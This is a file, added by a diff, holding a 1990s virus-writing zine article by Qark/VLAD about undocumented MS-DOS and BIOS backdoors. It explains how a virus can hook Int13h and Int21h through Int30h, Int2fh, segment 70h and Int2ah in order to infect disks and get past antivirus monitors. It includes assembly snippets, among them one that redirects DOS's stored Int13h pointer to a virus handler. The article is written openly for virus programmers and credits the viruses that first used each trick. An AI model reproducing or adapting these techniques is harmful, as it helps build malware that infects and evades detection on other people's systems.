@@ -1,0 +1,162 @@
+
+
+   Backdoors!
+   +--------+                         Qark/VLAD
+
+   
+   The information in this article concerns the backdoors in MS-DOS and
+   BIOS that can be used and abused by a virus for it's own ends!  Most
+   of them concern the Int21h DOS services interrupt and Int13h Disk
+   services.
+
+   Int40h - The floppy disk handler gets relocated to Int40h by the Hard
+	      disk BIOS and is called by Int 13h.  Int40h can be hooked and
+	      used to infect floppy disks.  Be cautious when using this
+	      because if no harddisk is present it isn't set.
+
+   Int30h - This is not infact an interrupt at all.  It is a far jump
+	      to the original interrupt 21h handler that is stored at
+	      the address of int30h.  It was originally used for the CP/M
+	      emulation in earlier versions of DOS and remains there today.
+	      If you look at the PSP information, at PSP:[5] is a 'call
+	      to the DOS function dispatcher'.  It actually calls the int30h
+	      we are talking about (but due to a microsoft stuff up it misses
+	      by two bytes).  There are two ways of using this backdoor, the
+	      first way could be for a really hard method for infection or a
+	      good destructive payload.  You can use it directly by calling
+	      it in an unusual fashion.  This function could be messed up by
+	      some programs but I have yet to see it not work anywhere.
+	      Thanx go out to John Switzer for supplying me for this
+	      information although I'm sure he wouldn't appreciate it's
+	      use! :)
+
+		Method One:
+		  You can only use DOS functions AH=0 to 24h with this and
+		  any functions that require AL can't be used.
+
+		  Int21h        Proc    Near
+		  ;Call this from your code with the same parameters
+		  ; as the real DOS int 21h function.  
+		  ;Truly weird I'm sure you'll agree!
+
+			mov     cl,ah                   ;It uses CL.
+			mov     ax,offset return_addr   ;Stack is backwards
+			push    ax
+			push    cs
+			pushf                           ;Flags are last!!
+
+			db      0eah                    ;JMP FAR PTR 
+			dw      0c0h                    ;30h * 4
+			dw      0                       ;Interrupt table.
+		  return_addr:
+			ret                             ;Back to user.
+		  Int21h        EndP
+
+		Method Two:
+		  This is different in that it uses the segment:offset
+		  address of the Int30h to get the original 'proper' Int21h
+		  that we are all used to.  This method is used by the
+		  writers of the MG virus (who also wrote creeping death,
+		  very talented and good researchers!)  Anyway you can work
+		  that out yourself, thats why it's called research!
+
+   Int2fh - When DOS gets loaded it hooks int13h and saves the original
+   ah=13h     addresses for its own use.  When this function is called it
+	      returns two addresses where one is slightly closer to the
+	      original int13h than the other, but I'm not too sure which is
+	      the closer of the two (they are often equal).  If you play
+	      with this yourself look it up in Ralf Brown's, you can probably
+	      point the DOS calls to your virus if you do it right.
+
+	      To grab the original int13h without messing up DOS:
+
+			mov     ah,13h
+			int     2fh     ;Get the int13h's
+
+			push    es      ;Save them
+			push    ds
+			push    dx
+			push    bx
+
+			int     2fh     ;Put them back to what they were.
+
+			pop     bx      ;Now we've got our handlers.
+			pop     dx
+			pop     ds
+			pop     es
+
+	      ;From here you can either choose to use ES:BX or DS:DX
+	      ;as your int13h.
+
+   Seg70h - Segment 70h is used by DOS.  All DOS disk access passes through
+	      it at sometime.  All you have to do is scan through it for
+	      the bytes of the different calls.  This method was first
+	      used by the Creeping Death virus and is used in the 1984
+	      (listed as 'ignorant' by CARO) and Daemon viruses.  I'd 
+	      suggest running through this with a debugger and having a
+	      look to work out what's going on.  DOS has been using 70:B4
+	      to store the original Int 13h since DOS 3.3.
+
+		mov       ax,70h
+		mov       ds,ax
+		mov       si,2
+	      first_backdoor:
+		or      si,si
+		jz      wherever
+
+		dec     si              ;SI-1
+		lodsw                   ;DS:[SI] to AX  SI+2
+
+		cmp     ax,1effh        ;FF1E = CALL FAR PTR [xxxx]
+		jnz     first_backdoor
+
+		cmp     word ptr [si],0b4h      ;This is just there :)
+		jnz     first_backdoor
+
+		jmp     set_fake_int13          ;We've found it!
+
+	      set_fake_int13h:
+		mov     si,[si]                 ;SI=Where the address is
+						;stored.
+		;save the int13h into the virus
+		mov     cs:orig_store,word ptr [si]
+		mov     cs:orig_store+2,word ptr [si+2]
+		;point it to our virus
+		mov     word ptr [si],offset our_int13
+		mov     word ptr [si+2],cs
+
+		;ret or whatever...
+
+   Int2fh - Have a look at this interrupt in Ralf Browns (a must for every
+	      virus programmer) it can do ALL the interrupt 21h functions!
+	      The only problem is working out the DOS stacks and so
+	      on.  It is handy for bypassing AV monitors, but it is much
+	      too huge to go into in any detail.
+
+   BIOS   - Within BIOS lurk a number of stationary entry points to
+   entry      interrupts.  There are a few problems with these, as alot
+   points     of BIOSes are incompatible and QEMM won't work with them
+	      but they can be useful because there isn't ANYTHING that 
+	      can be done to stop it.
+
+	      Here are a list of addresses that are guaranteed not to
+	      work half the time but have a look anyway.
+
+		 F000:EC59      Floppy disk int 13h
+		 F000:F859      Int 15h, sometimes useful
+
+   Int2ah - This is called by Int 21h on every file related function.  By
+   ah=82h     modifying the stack or certain registers you can change the
+	      function that was called to whatever you want.  DOS stores   
+	      the function multiplied by two in BL (eg Int 21h AH=40h will
+	      be BL=80h when the int 2ah is called.).  If you change this
+	      BL to another function it should fool most AV monitors.  This
+	      may only work for some versions of DOS.
+
+   Int21h - If you call this service you can do any DOS function.  Have a
+   ax=5d00h   look!  All you have to do is set your registers up in a table.
+	      It should be easy to write a basic simulated int21h using
+	      this.
+
+   Anymore ?  Not that I can think of!  If you know any... tell me!!
+
